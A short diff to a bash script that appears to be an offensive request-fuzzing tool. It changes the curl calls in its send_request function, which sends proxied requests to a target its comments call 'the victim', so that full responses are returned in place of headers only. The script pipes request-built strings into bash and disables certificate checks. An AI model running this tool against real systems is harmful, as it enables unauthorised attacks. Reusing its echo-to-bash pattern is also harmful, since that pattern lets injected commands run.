@@ -26,7 +26,7 @@ function send_request { ##### Check if the proxy is working and send the request
 		par3=$(echo $request | awk -F "Canal_1" '{print $2}')
 		par="""$par1$par2$par3"""
 
-		res=$(echo "curl -s -k -I --connect-timeout 20 $protocol $proxy $par" | bash 2>/dev/null) ##### Send the request to the victim
+		res=$(echo "curl -s -k --connect-timeout 20 $protocol $proxy $par" | bash 2>/dev/null) ##### Send the request to the victim
 		res2=$(echo $res | wc -c)
 		res1=$(echo $res | egrep """$filter""" | wc -c)
 
@@ -53,7 +53,7 @@ function send_request { ##### Check if the proxy is working and send the request
 		par5=$(echo $request | awk -F "Canal_2" '{print $2}')
 		par="""$par1$par2$par3$par4$par5"""
 
-		res=$(echo "curl -s -k -I --connect-timeout 20 $protocol $proxy $par" | bash 2>/dev/null) ##### Send the request to the victim
+		res=$(echo "curl -s -k --connect-timeout 20 $protocol $proxy $par" | bash 2>/dev/null) ##### Send the request to the victim
 		res2=$(echo $res | wc -c)
 		res1=$(echo $res | egrep """$filter""" | wc -c)
 
